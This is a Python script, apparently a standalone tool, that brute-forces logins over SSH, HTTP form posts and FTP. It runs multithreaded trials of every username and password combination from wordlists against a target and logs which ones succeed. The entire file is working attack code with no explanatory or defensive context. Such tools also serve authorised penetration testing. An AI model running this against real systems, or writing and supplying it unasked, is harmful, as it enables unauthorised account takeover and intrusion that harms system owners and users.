import argparse
import threading
import paramiko
import requests
from ftplib import FTP
from queue import Queue

# Logging for attempts
def log_attempt(username, password, protocol, result):
    with open(f"{protocol}_attempts.log", "a") as log_file:
        log_file.write(f"[{protocol}] Attempted: {username}:{password} - {result}\n")

# SSH Brute-force function
def ssh_bruteforce(target, username, password):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(target, username=username, password=password, timeout=3)
        print(f"[+] SSH Login successful: {username}:{password}")
        log_attempt(username, password, "SSH", "Success")
    except paramiko.AuthenticationException:
        print(f"[-] SSH Login failed: {username}:{password}")
        log_attempt(username, password, "SSH", "Failed")
    except Exception as e:
        log_attempt(username, password, "SSH", f"Error: {e}")
    finally:
        client.close()

# HTTP Brute-force function
def http_bruteforce(target, username, password, login_url):
    data = {"username": username, "password": password}
    try:
        response = requests.post(login_url, data=data, timeout=3)
        if "login successful" in response.text.lower():
            print(f"[+] HTTP Login successful: {username}:{password}")
            log_attempt(username, password, "HTTP", "Success")
        else:
            print(f"[-] HTTP Login failed: {username}:{password}")
            log_attempt(username, password, "HTTP", "Failed")
    except Exception as e:
        log_attempt(username, password, "HTTP", f"Error: {e}")

# FTP Brute-force function
def ftp_bruteforce(target, username, password):
    ftp = FTP()
    try:
        ftp.connect(target, 21, timeout=3)
        ftp.login(user=username, passwd=password)
        print(f"[+] FTP Login successful: {username}:{password}")
        log_attempt(username, password, "FTP", "Success")
        ftp.quit()
    except Exception:
        print(f"[-] FTP Login failed: {username}:{password}")
        log_attempt(username, password, "FTP", "Failed")

# Worker for multithreading
def worker(queue, target, protocol, login_url=None):
    while not queue.empty():
        username, password = queue.get()
        if protocol == "ssh":
            ssh_bruteforce(target, username, password)
        elif protocol == "http":
            http_bruteforce(target, username, password, login_url)
        elif protocol == "ftp":
            ftp_bruteforce(target, username, password)
        queue.task_done()

# Main function
def main():
    parser = argparse.ArgumentParser(description="Hydra-like password cracker")
    parser.add_argument("-t", "--target", required=True, help="Target IP address or URL")
    parser.add_argument("-p", "--protocol", required=True, choices=["ssh", "http", "ftp"], help="Protocol to brute-force")
    parser.add_argument("-u", "--userlist", required=True, help="File with usernames")
    parser.add_argument("-w", "--wordlist", required=True, help="File with passwords")
    parser.add_argument("-l", "--login-url", help="Login URL for HTTP brute-force (required for HTTP)")
    parser.add_argument("-T", "--threads", type=int, default=4, help="Number of threads (default: 4)")
    
    args = parser.parse_args()

    # Read user and password lists
    with open(args.userlist, 'r') as ufile, open(args.wordlist, 'r') as wfile:
        usernames = [line.strip() for line in ufile.readlines()]
        passwords = [line.strip() for line in wfile.readlines()]

    # Create a queue for username:password combinations
    queue = Queue()
    for username in usernames:
        for password in passwords:
            queue.put((username, password))

    # Check if login_url is provided for HTTP
    if args.protocol == "http" and not args.login_url:
        print("Login URL is required for HTTP brute-force")
        return

    # Start threads for brute-forcing
    for _ in range(args.threads):
        threading.Thread(target=worker, args=(queue, args.target, args.protocol, args.login_url)).start()

    queue.join()

if __name__ == "__main__":
    main()
